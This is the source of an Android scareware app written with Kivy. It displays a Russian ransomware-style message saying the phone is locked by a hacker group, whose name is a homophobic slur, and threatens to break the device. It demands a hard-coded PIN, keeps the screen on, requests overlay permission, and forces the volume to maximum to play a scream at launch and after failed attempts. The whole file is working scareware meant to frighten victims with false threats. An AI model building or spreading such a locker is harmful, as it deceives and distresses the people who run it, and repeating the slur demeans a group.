# language: Python, file: main.py
import os
import shutil
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform
from kivy.metrics import dp

if platform == "android":
    from jnius import autoclass, cast
    from android.permissions import request_permissions, Permission
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    mActivity = PythonActivity.mActivity
    Context = autoclass('android.content.Context')
    MediaPlayer = autoclass('android.media.MediaPlayer')
    AudioManager = autoclass('android.media.AudioManager')

    _player = None

    def play_scream():
        global _player
        try:
            src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scream.mp3")
            dst = os.path.join(mActivity.getCacheDir().getAbsolutePath(), "scream.mp3")
            if not os.path.exists(dst) and os.path.exists(src):
                shutil.copy2(src, dst)

            if os.path.exists(dst):
                _player = MediaPlayer()
                _player.setDataSource("file://" + dst)
                _player.prepare()

                am = cast('android.media.AudioManager',
                          mActivity.getSystemService(Context.AUDIO_SERVICE))
                am.setStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                    0
                )

                _player.start()

                def _stop(dt):
                    global _player
                    try:
                        if _player:
                            _player.stop()
                            _player.release()
                    except Exception:
                        pass
                    _player = None

                Clock.schedule_once(_stop, 10.0)
        except Exception as e:
            print(f"Sound error: {e}")

    def keep_screen_on():
        try:
            WindowManager = autoclass('android.view.WindowManager')
            LayoutParams = autoclass('android.view.WindowManager$LayoutParams')
            mActivity.getWindow().addFlags(LayoutParams.FLAG_KEEP_SCREEN_ON)
        except Exception:
            pass
else:
    def play_scream(): pass
    def keep_screen_on(): pass


class LockerLayout(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.attempts = 0

        self.label = Label(
            text=(
                "ТВОЙ ТЕЛЕФОН ЗАБЛОКИРОВАН\n"
                "ХАКЕРСКОЙ ГРУППОЙ PIDORI\n\n"
                "Любая попытка снять ограничение\n"
                "приведёт к поломке телефона.\n\n"
                "Введите пароль:"
            ),
            halign="center",
            valign="middle",
            font_size=dp(22),
            color=(1, 0, 0, 1),
            size_hint=(1, 0.6),
            pos_hint={"center_x": 0.5, "center_y": 0.65},
        )
        self.label.bind(size=self.label.setter('text_size'))
        self.add_widget(self.label)

        self.entry = TextInput(
            input_filter="int",
            password=True,
            multiline=False,
            size_hint=(0.6, 0.1),
            pos_hint={"center_x": 0.5, "center_y": 0.32},
            font_size=dp(24),
            background_color=(0.2, 0, 0, 1),
            foreground_color=(1, 0, 0, 1),
        )
        self.add_widget(self.entry)

        self.btn = Button(
            text="ENTER",
            size_hint=(0.4, 0.08),
            pos_hint={"center_x": 0.5, "center_y": 0.15},
            background_color=(0.6, 0, 0, 1),
        )
        self.btn.bind(on_release=self.check_pass)
        self.add_widget(self.btn)

    def check_pass(self, instance):
        if self.entry.text == "755":
            if platform == "android":
                mActivity.finish()
            else:
                App.get_running_app().stop()
        else:
            self.attempts += 1
            self.label.text = (
                f"НЕВЕРНО!\nПопыток осталось: {5 - self.attempts}\n\n"
                "Введите пароль:"
            )
            if self.attempts >= 5:
                play_scream()
                self.attempts = 0


class LockerApp(App):
    def on_start(self):
        if platform == "android":
            request_permissions([
                Permission.SYSTEM_ALERT_WINDOW,
                Permission.MODIFY_AUDIO_SETTINGS,
                Permission.FOREGROUND_SERVICE,
            ])
            keep_screen_on()
            Clock.schedule_once(lambda dt: play_scream(), 0.5)

    def build(self):
        return LockerLayout()


if __name__ == "__main__":
    LockerApp().run()
